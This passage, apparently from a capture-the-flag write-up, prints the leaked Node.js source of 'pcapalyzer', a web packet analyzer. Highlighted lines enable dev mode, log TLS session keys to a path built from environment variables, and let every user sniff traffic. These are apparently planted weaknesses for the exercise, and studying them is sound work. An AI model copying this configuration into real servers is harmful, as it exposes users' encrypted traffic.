&lt;span class="go"&gt;const cluster = require(&amp;#39;cluster&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const os = require(&amp;#39;os&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const path = require(&amp;#39;path&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const fs = require(&amp;#39;fs&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const http2 = require(&amp;#39;http2&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const koa = require(&amp;#39;koa&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const Router = require(&amp;#39;koa-router&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const mime = require(&amp;#39;mime-types&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const mongoose = require(&amp;#39;mongoose&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const koaBody = require(&amp;#39;koa-body&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const cookie = require(&amp;#39;koa-cookie&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const execSync = require(&amp;#39;child_process&amp;#39;).execSync;&lt;/span&gt;
&lt;span class="go"&gt;const execAsync = require(&amp;#39;child_process&amp;#39;).exec;&lt;/span&gt;
&lt;span class="go"&gt;const redis = require(&amp;quot;redis&amp;quot;);&lt;/span&gt;
&lt;span class="go"&gt;const redis_connection = redis.createClient();&lt;/span&gt;
&lt;span class="go"&gt;const {promisify} = require(&amp;#39;util&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;const getAsync = promisify(redis_connection.get).bind(redis_connection);&lt;/span&gt;
&lt;span class="go"&gt;const setAsync = promisify(redis_connection.set).bind(redis_connection);&lt;/span&gt;
&lt;span class="go"&gt;const delAsync = promisify(redis_connection.del).bind(redis_connection);&lt;/span&gt;
&lt;span class="go"&gt;const sha1 = require(&amp;#39;sha1&amp;#39;);&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It works! Here's the full file. (There was some binary content in the middle
of the file that I removed):&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/node&lt;/span&gt;
&lt;span class="c1"&gt;//pcapalyzer - The web based packet analyzer&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cluster&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cluster&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;os&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;http2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;koa&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;koa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Router&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;koa-router&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;mime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mime-types&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;mongoose&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mongoose&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;koaBody&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;koa-body&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;koa-cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;execSync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;child_process&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;execSync&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;execAsync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;child_process&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;redis&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;redis&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;redis_connection&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;redis&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createClient&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;promisify&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;util&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;getAsync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;promisify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;redis_connection&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;redis_connection&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;setAsync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;promisify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;redis_connection&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;set&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;redis_connection&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;delAsync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;promisify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;redis_connection&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;del&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;redis_connection&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;sha1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sha1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;events&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;EventEmitter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;defaultMaxListeners&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;Infinity&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;log&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;dev_mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;key_log_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;dev_mode&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nx"&gt;__dirname&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;DEV&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;SSLKEYLOGFILE&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;readFileSync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;__dirname&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/keys/server.key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;  &lt;span class="nx"&gt;cert&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;readFileSync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;__dirname&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/keys/server.crt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;/span&gt;  &lt;span class="nx"&gt;http2&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;protocol&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;h2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;         &lt;span class="c1"&gt;// HTTP2 only. NOT HTTP1 or HTTP1.1&lt;/span&gt;
    &lt;span class="nx"&gt;protocols&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;h2&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;],&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nx"&gt;keylog&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;key_log_path&lt;/span&gt;     &lt;span class="c1"&gt;//used for dev mode to view traffic. Stores a few minutes worth at a time&lt;/span&gt;
&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="c1"&gt;//==================================&lt;/span&gt;
&lt;span class="c1"&gt;//Standard Mongoose Connection Stuff&lt;/span&gt;
&lt;span class="c1"&gt;//==================================&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;koa&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;router&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Router&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;use&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;use&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;routes&lt;/span&gt;&lt;span class="p"&gt;()).&lt;/span&gt;&lt;span class="nx"&gt;use&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;allowedMethods&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;span class="nx"&gt;mongoose&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mongodb://localhost:27017/packalyzer&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,{&lt;/span&gt; &lt;span class="nx"&gt;useNewUrlParser&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Schema&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mongoose&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Schema&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;userSchema&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Schema&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
  &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;required&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;unique&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="nx"&gt;email&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;required&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;unique&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;required&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="nx"&gt;is_admin&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;Boolean&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;required&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="nx"&gt;captures&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;required&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Users&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mongoose&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;model&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Users&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;userSchema&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;//Sets Users to be allowed to sniff or just admins&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Allow_All_To_Sniff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;//==================================&lt;/span&gt;
&lt;span class="c1"&gt;//Standard Mongoose Connection Stuff&lt;/span&gt;
&lt;span class="c1"&gt;//==================================&lt;/span&gt;

&lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;clean&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;deleteValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;deleteValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;splice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;uniqueArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;arrArg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;arrArg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;elem&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;pos&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;arr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;arr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;elem&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;pos&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;load_envs&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;dirs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
